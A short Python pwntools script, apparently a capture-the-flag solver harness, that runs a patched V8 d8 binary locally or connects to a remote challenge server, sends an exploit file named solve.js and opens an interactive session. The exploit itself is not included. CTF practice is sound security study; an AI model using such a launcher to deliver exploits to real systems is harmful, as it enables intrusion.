#!/usr/bin/env python3

from pwn import *

elf = ELF("./d8_patched")

context.binary = elf
context.terminal = ('kgx', '-e')

def conn():
    if args.REMOTE:
        r = remote("xebec.cylabacademy.net", 29360)
    elif args.GDB:
        r = gdb.debug([elf.path, "--allow-natives-syntax", "solve.js"], '''
                                continue
                      ''')
    else:
        r = process([elf.path, "--allow-natives-syntax", "solve.js"])

    return r


def main():
    r = conn()

    if args.REMOTE:
        with open("solve.js", "r") as f:
            payload = f.read().encode()

        r.sendlineafter(b'Provide size. Must be < 5k:', str(len(payload)).encode())
        r.sendlineafter(b'Provide script please!!', payload)

    r.interactive()


if __name__ == "__main__":
    main()
